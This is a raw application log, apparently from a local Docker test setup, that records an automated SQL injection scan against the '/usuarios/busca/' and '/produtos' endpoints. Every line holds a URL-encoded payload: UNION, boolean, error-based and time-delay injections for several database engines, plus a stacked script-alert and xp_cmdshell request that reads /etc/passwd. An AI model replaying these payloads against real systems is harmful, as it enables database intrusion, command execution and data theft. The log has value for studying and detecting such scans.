api-1  | Servidor rodando em http://0.0.0.0:8000
api-1  | 172.18.0.1 - GET /usuarios/busca/?nome=teste%27%2F%2A%2A%2FUNION%2F%2A%2A%2FALL%2F%2A%2A%2FSELECT%2F%2A%2A%2F%28CHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%28CONVERT_TO%28%27Hhpa%27%2CQUOTE_IDENT%28NULL%29%29%2F%2A%2A%2FIS%2F%2A%2A%2FNULL%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F%28CHR%2849%29%29%2F%2A%2A%2FELSE%2F%2A%2A%2F%28CHR%2848%29%29%2F%2A%2A%2FEND%29%29%7C%7C%28CHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%29%2CNULL%2CNULL%2CNULL--%2F%2A%2A%2FaIGj HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios/busca/?nome=teste%27%2F%2A%2A%2FUNION%2F%2A%2A%2FALL%2F%2A%2A%2FSELECT%2F%2A%2A%2FCHAR%28113%29%2BCHAR%28106%29%2BCHAR%28113%29%2BCHAR%28112%29%2BCHAR%28113%29%2B%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%28IS_SRVROLEMEMBER%28NULL%29%2F%2A%2A%2FIS%2F%2A%2A%2FNULL%29%2F%2A%2A%2FTHEN%2F%2A%2A%2FCHAR%2849%29%2F%2A%2A%2FELSE%2F%2A%2A%2FCHAR%2848%29%2F%2A%2A%2FEND%29%2BCHAR%28113%29%2BCHAR%28106%29%2BCHAR%28113%29%2BCHAR%28120%29%2BCHAR%28113%29%2CNULL%2CNULL%2CNULL--%2F%2A%2A%2FdHNd HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios/busca/?nome=teste%27%2F%2A%2A%2FUNION%2F%2A%2A%2FALL%2F%2A%2A%2FSELECT%2F%2A%2A%2FCHAR%28113%2C106%2C113%2C112%2C113%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%28LAST_INSERT_ROWID%28%29%3DLAST_INSERT_ROWID%28%29%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%29%7C%7CCHAR%28113%2C106%2C113%2C120%2C113%29%2CNULL%2CNULL%2CNULL--%2F%2A%2A%2FbxpR HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios/busca/?nome=teste%27%2F%2A%2A%2FUNION%2F%2A%2A%2FALL%2F%2A%2A%2FSELECT%2F%2A%2A%2FCHAR%28113%2C106%2C113%2C112%2C113%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%28SQLITE_VERSION%28%29%3DSQLITE_VERSION%28%29%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%29%7C%7CCHAR%28113%2C106%2C113%2C120%2C113%29%2CNULL%2CNULL%2CNULL--%2F%2A%2A%2FXgUZ HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios/busca/?nome=teste%27%2F%2A%2A%2FUNION%2F%2A%2A%2FALL%2F%2A%2A%2FSELECT%2F%2A%2A%2FCHAR%28113%2C106%2C113%2C112%2C113%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%28RANDOMBLOB%28-1%29%2F%2A%2A%2FIS%2F%2A%2A%2FNOT%2F%2A%2A%2FNULL%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%29%7C%7CCHAR%28113%2C106%2C113%2C120%2C113%29%2CNULL%2CNULL%2CNULL--%2F%2A%2A%2FqdLN HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos?COUe=8115%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23 HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos HTTP/1.1
api-1  | 172.18.0.1 - GET /5372 HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos%2C.%27%28%2C%28%29%29%22%29 HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos%27GqERiA%3C%27%22%3ESAFKFm HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos%29%2F%2A%2A%2FAND%2F%2A%2A%2F9783%3D8564%2F%2A%2A%2FAND%2F%2A%2A%2F%281168%3D1168 HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos%29%2F%2A%2A%2FAND%2F%2A%2A%2F4438%3D4438%2F%2A%2A%2FAND%2F%2A%2A%2F%284559%3D4559 HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos%2F%2A%2A%2FAND%2F%2A%2A%2F1817%3D5712 HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos%2F%2A%2A%2FAND%2F%2A%2A%2F4438%3D4438 HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos%27%29%2F%2A%2A%2FAND%2F%2A%2A%2F3559%3D5329%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27CZpr%27%3D%27CZpr HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos%27%29%2F%2A%2A%2FAND%2F%2A%2A%2F4438%3D4438%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27hUJm%27%3D%27hUJm HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos%27%2F%2A%2A%2FAND%2F%2A%2A%2F1721%3D8186%2F%2A%2A%2FAND%2F%2A%2A%2F%27dfIx%27%3D%27dfIx HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos%27%2F%2A%2A%2FAND%2F%2A%2A%2F4438%3D4438%2F%2A%2A%2FAND%2F%2A%2A%2F%27ZGBw%27%3D%27ZGBw HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos%2F%2A%2A%2FAND%2F%2A%2A%2F3205%3D3140--%2F%2A%2A%2FvaQI HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos%2F%2A%2A%2FAND%2F%2A%2A%2F4438%3D4438--%2F%2A%2A%2FGYRg HTTP/1.1
api-1  | 172.18.0.1 - GET /%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%287396%3D3385%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F%27produtos%27%2F%2A%2A%2FELSE%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F3385%2F%2A%2A%2FUNION%2F%2A%2A%2FSELECT%2F%2A%2A%2F9580%29%2F%2A%2A%2FEND%29%29 HTTP/1.1
api-1  | 172.18.0.1 - GET /%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%286875%3D6875%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F%27produtos%27%2F%2A%2A%2FELSE%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F3190%2F%2A%2A%2FUNION%2F%2A%2A%2FSELECT%2F%2A%2A%2F7895%29%2F%2A%2A%2FEND%29%29 HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos%29%2F%2A%2A%2FAND%2F%2A%2A%2FEXTRACTVALUE%283545%2CCONCAT%280x5c%2C0x7178627071%2C%28SELECT%2F%2A%2A%2F%28ELT%283545%3D3545%2C1%29%29%29%2C0x716b706b71%29%29%2F%2A%2A%2FAND%2F%2A%2A%2F%288327%3D8327 HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos%2F%2A%2A%2FAND%2F%2A%2A%2FEXTRACTVALUE%283545%2CCONCAT%280x5c%2C0x7178627071%2C%28SELECT%2F%2A%2A%2F%28ELT%283545%3D3545%2C1%29%29%29%2C0x716b706b71%29%29 HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos%27%29%2F%2A%2A%2FAND%2F%2A%2A%2FEXTRACTVALUE%283545%2CCONCAT%280x5c%2C0x7178627071%2C%28SELECT%2F%2A%2A%2F%28ELT%283545%3D3545%2C1%29%29%29%2C0x716b706b71%29%29%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27jIBw%27%3D%27jIBw HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos%27%2F%2A%2A%2FAND%2F%2A%2A%2FEXTRACTVALUE%283545%2CCONCAT%280x5c%2C0x7178627071%2C%28SELECT%2F%2A%2A%2F%28ELT%283545%3D3545%2C1%29%29%29%2C0x716b706b71%29%29%2F%2A%2A%2FAND%2F%2A%2A%2F%27gzVL%27%3D%27gzVL HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos%2F%2A%2A%2FAND%2F%2A%2A%2FEXTRACTVALUE%283545%2CCONCAT%280x5c%2C0x7178627071%2C%28SELECT%2F%2A%2A%2F%28ELT%283545%3D3545%2C1%29%29%29%2C0x716b706b71%29%29--%2F%2A%2A%2FnWNn HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos%29%2F%2A%2A%2FAND%2F%2A%2A%2F5450%3DCAST%28%28CHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%2898%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%285450%3D5450%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%28112%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%29%2F%2A%2A%2FAS%2F%2A%2A%2FNUMERIC%29%2F%2A%2A%2FAND%2F%2A%2A%2F%284583%3D4583 HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos%2F%2A%2A%2FAND%2F%2A%2A%2F5450%3DCAST%28%28CHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%2898%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%285450%3D5450%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%28112%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%29%2F%2A%2A%2FAS%2F%2A%2A%2FNUMERIC%29 HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos%27%29%2F%2A%2A%2FAND%2F%2A%2A%2F5450%3DCAST%28%28CHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%2898%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%285450%3D5450%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%28112%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%29%2F%2A%2A%2FAS%2F%2A%2A%2FNUMERIC%29%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27bDar%27%3D%27bDar HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos%27%2F%2A%2A%2FAND%2F%2A%2A%2F5450%3DCAST%28%28CHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%2898%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%285450%3D5450%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%28112%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%29%2F%2A%2A%2FAS%2F%2A%2A%2FNUMERIC%29%2F%2A%2A%2FAND%2F%2A%2A%2F%27SmDh%27%3D%27SmDh HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos%2F%2A%2A%2FAND%2F%2A%2A%2F5450%3DCAST%28%28CHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%2898%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%285450%3D5450%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%28112%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%29%2F%2A%2A%2FAS%2F%2A%2A%2FNUMERIC%29--%2F%2A%2A%2FGLoj HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos%29%2F%2A%2A%2FAND%2F%2A%2A%2F9172%2F%2A%2A%2FIN%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F%28CHAR%28113%29%2BCHAR%28120%29%2BCHAR%2898%29%2BCHAR%28112%29%2BCHAR%28113%29%2B%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%289172%3D9172%29%2F%2A%2A%2FTHEN%2F%2A%2A%2FCHAR%2849%29%2F%2A%2A%2FELSE%2F%2A%2A%2FCHAR%2848%29%2F%2A%2A%2FEND%29%29%2BCHAR%28113%29%2BCHAR%28107%29%2BCHAR%28112%29%2BCHAR%28107%29%2BCHAR%28113%29%29%29%2F%2A%2A%2FAND%2F%2A%2A%2F%284877%3D4877 HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos%2F%2A%2A%2FAND%2F%2A%2A%2F9172%2F%2A%2A%2FIN%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F%28CHAR%28113%29%2BCHAR%28120%29%2BCHAR%2898%29%2BCHAR%28112%29%2BCHAR%28113%29%2B%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%289172%3D9172%29%2F%2A%2A%2FTHEN%2F%2A%2A%2FCHAR%2849%29%2F%2A%2A%2FELSE%2F%2A%2A%2FCHAR%2848%29%2F%2A%2A%2FEND%29%29%2BCHAR%28113%29%2BCHAR%28107%29%2BCHAR%28112%29%2BCHAR%28107%29%2BCHAR%28113%29%29%29 HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos%27%29%2F%2A%2A%2FAND%2F%2A%2A%2F9172%2F%2A%2A%2FIN%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F%28CHAR%28113%29%2BCHAR%28120%29%2BCHAR%2898%29%2BCHAR%28112%29%2BCHAR%28113%29%2B%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%289172%3D9172%29%2F%2A%2A%2FTHEN%2F%2A%2A%2FCHAR%2849%29%2F%2A%2A%2FELSE%2F%2A%2A%2FCHAR%2848%29%2F%2A%2A%2FEND%29%29%2BCHAR%28113%29%2BCHAR%28107%29%2BCHAR%28112%29%2BCHAR%28107%29%2BCHAR%28113%29%29%29%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27LqzG%27%3D%27LqzG HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos%27%2F%2A%2A%2FAND%2F%2A%2A%2F9172%2F%2A%2A%2FIN%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F%28CHAR%28113%29%2BCHAR%28120%29%2BCHAR%2898%29%2BCHAR%28112%29%2BCHAR%28113%29%2B%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%289172%3D9172%29%2F%2A%2A%2FTHEN%2F%2A%2A%2FCHAR%2849%29%2F%2A%2A%2FELSE%2F%2A%2A%2FCHAR%2848%29%2F%2A%2A%2FEND%29%29%2BCHAR%28113%29%2BCHAR%28107%29%2BCHAR%28112%29%2BCHAR%28107%29%2BCHAR%28113%29%29%29%2F%2A%2A%2FAND%2F%2A%2A%2F%27nmDU%27%3D%27nmDU HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos%2F%2A%2A%2FAND%2F%2A%2A%2F9172%2F%2A%2A%2FIN%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F%28CHAR%28113%29%2BCHAR%28120%29%2BCHAR%2898%29%2BCHAR%28112%29%2BCHAR%28113%29%2B%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%289172%3D9172%29%2F%2A%2A%2FTHEN%2F%2A%2A%2FCHAR%2849%29%2F%2A%2A%2FELSE%2F%2A%2A%2FCHAR%2848%29%2F%2A%2A%2FEND%29%29%2BCHAR%28113%29%2BCHAR%28107%29%2BCHAR%28112%29%2BCHAR%28107%29%2BCHAR%28113%29%29%29--%2F%2A%2A%2FmBkH HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos%29%2F%2A%2A%2FAND%2F%2A%2A%2F5557%3D%28SELECT%2F%2A%2A%2FUPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%2898%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%285557%3D5557%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%28112%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL%29%2F%2A%2A%2FAND%2F%2A%2A%2F%289659%3D9659 HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos%2F%2A%2A%2FAND%2F%2A%2A%2F5557%3D%28SELECT%2F%2A%2A%2FUPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%2898%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%285557%3D5557%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%28112%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL%29 HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos%27%29%2F%2A%2A%2FAND%2F%2A%2A%2F5557%3D%28SELECT%2F%2A%2A%2FUPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%2898%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%285557%3D5557%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%28112%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL%29%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27bCUM%27%3D%27bCUM HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos%27%2F%2A%2A%2FAND%2F%2A%2A%2F5557%3D%28SELECT%2F%2A%2A%2FUPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%2898%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%285557%3D5557%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%28112%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL%29%2F%2A%2A%2FAND%2F%2A%2A%2F%27IERq%27%3D%27IERq HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos%2F%2A%2A%2FAND%2F%2A%2A%2F5557%3D%28SELECT%2F%2A%2A%2FUPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%2898%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%285557%3D5557%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%28112%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL%29--%2F%2A%2A%2FaBBo HTTP/1.1
api-1  | 172.18.0.1 - GET /%28SELECT%2F%2A%2A%2FCONCAT%28CONCAT%28%27qxbpq%27%2C%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%289208%3D9208%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F%271%27%2F%2A%2A%2FELSE%2F%2A%2A%2F%270%27%2F%2A%2A%2FEND%29%29%2C%27qkpkq%27%29%29 HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos%29%3BSELECT%2F%2A%2A%2FPG_SLEEP%285%29-- HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos%3BSELECT%2F%2A%2A%2FPG_SLEEP%285%29-- HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos%27%29%3BSELECT%2F%2A%2A%2FPG_SLEEP%285%29-- HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos%27%3BSELECT%2F%2A%2A%2FPG_SLEEP%285%29-- HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos%29%3BWAITFOR%2F%2A%2A%2FDELAY%2F%2A%2A%2F%270%3A0%3A5%27-- HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos%3BWAITFOR%2F%2A%2A%2FDELAY%2F%2A%2A%2F%270%3A0%3A5%27-- HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos%27%29%3BWAITFOR%2F%2A%2A%2FDELAY%2F%2A%2A%2F%270%3A0%3A5%27-- HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos%27%3BWAITFOR%2F%2A%2A%2FDELAY%2F%2A%2A%2F%270%3A0%3A5%27-- HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos%29%3BSELECT%2F%2A%2A%2FDBMS_PIPE.RECEIVE_MESSAGE%28CHR%28112%29%7C%7CCHR%2899%29%7C%7CCHR%28111%29%7C%7CCHR%2872%29%2C5%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL-- HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos%3BSELECT%2F%2A%2A%2FDBMS_PIPE.RECEIVE_MESSAGE%28CHR%28112%29%7C%7CCHR%2899%29%7C%7CCHR%28111%29%7C%7CCHR%2872%29%2C5%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL-- HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos%27%29%3BSELECT%2F%2A%2A%2FDBMS_PIPE.RECEIVE_MESSAGE%28CHR%28112%29%7C%7CCHR%2899%29%7C%7CCHR%28111%29%7C%7CCHR%2872%29%2C5%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL-- HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos%27%3BSELECT%2F%2A%2A%2FDBMS_PIPE.RECEIVE_MESSAGE%28CHR%28112%29%7C%7CCHR%2899%29%7C%7CCHR%28111%29%7C%7CCHR%2872%29%2C5%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL-- HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos%29%2F%2A%2A%2FAND%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F5683%2F%2A%2A%2FFROM%2F%2A%2A%2F%28SELECT%28SLEEP%285%29%29%29IeKn%29%2F%2A%2A%2FAND%2F%2A%2A%2F%282992%3D2992 HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos%2F%2A%2A%2FAND%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F5683%2F%2A%2A%2FFROM%2F%2A%2A%2F%28SELECT%28SLEEP%285%29%29%29IeKn%29 HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos%27%29%2F%2A%2A%2FAND%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F5683%2F%2A%2A%2FFROM%2F%2A%2A%2F%28SELECT%28SLEEP%285%29%29%29IeKn%29%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27gIQt%27%3D%27gIQt HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos%27%2F%2A%2A%2FAND%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F5683%2F%2A%2A%2FFROM%2F%2A%2A%2F%28SELECT%28SLEEP%285%29%29%29IeKn%29%2F%2A%2A%2FAND%2F%2A%2A%2F%27taEk%27%3D%27taEk HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos%2F%2A%2A%2FAND%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F5683%2F%2A%2A%2FFROM%2F%2A%2A%2F%28SELECT%28SLEEP%285%29%29%29IeKn%29--%2F%2A%2A%2FYSNa HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos%29%2F%2A%2A%2FAND%2F%2A%2A%2F3660%3D%28SELECT%2F%2A%2A%2F3660%2F%2A%2A%2FFROM%2F%2A%2A%2FPG_SLEEP%285%29%29%2F%2A%2A%2FAND%2F%2A%2A%2F%287230%3D7230 HTTP/1.1
